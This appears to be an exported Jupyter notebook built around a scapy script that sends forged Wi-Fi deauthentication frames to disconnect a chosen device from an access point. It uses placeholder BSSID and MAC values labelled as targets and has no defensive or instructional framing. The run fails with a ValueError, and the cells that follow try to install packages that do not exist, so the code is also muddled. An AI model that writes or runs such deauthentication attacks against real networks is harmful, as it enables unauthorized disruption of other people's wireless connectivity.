# %%
pip install scapy
# Out:
# ...
# Note: you may need to restart the kernel to use updated packages.

# %%
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp

def deauth_attack(bssid, target_mac):
    print(f"[*] Starting deauthentication attack against {bssid} with target MAC {target_mac}")
    pkt = RadioTap()/Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)/Dot11Deauth()
    sendp(pkt, count=10, inter=0.1, iface="wlan0mon")

if __name__ == "__main__":
    bssid = "00:14:22:01:23:45"  # Replace with the target BSSID
    target_mac = "11:22:33:44:55:66"  # Replace with the target MAC address
    deauth_attack(bssid, target_mac)
# Out:
# [*] Starting deauthentication attack against 00:14:22:01:23:45 with target MAC 11:22:33:44:55:66
# ---------------------------------------------------------------------------
# ValueError                                Traceback (most recent call last)
# Cell In[2], line 12
#      10 bssid = "00:14:22:01:23:45"  # Replace with the target BSSID
#      11 target_mac = "11:22:33:44:55:66"  # Replace with the target MAC address
# ---> 12 deauth_attack(bssid, target_mac)
#
# Cell In[2], line 7, in deauth_attack(bssid, target_mac)
#       5 print(f"[*] Starting deauthentication attack against {bssid} with target MAC {target_mac}")
#       6 pkt = RadioTap()/Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)/Dot11Deauth()
# ----> 7 sendp(pkt, count=10, inter=0.1, iface="wlan0mon")
#
# File /Library/Frameworks/Python.framework/Versions/3.14/lib/python3.14/site-packages/scapy/sendrecv.py:519, in sendp(x, iface, iface_hint, socket, **kargs)
# ...

# %%
pip install bssid-server
# Out:
# ERROR: Could not find a version that satisfies the requirement bssid-server (from versions: none)
# ERROR: No matching distribution found for bssid-server
# Note: you may need to restart the kernel to use updated packages.

# %%
pip install RadioTap
# Out:
# ERROR: Could not find a version that satisfies the requirement RadioTap (from versions: none)
# ERROR: No matching distribution found for RadioTap
# Note: you may need to restart the kernel to use updated packages.
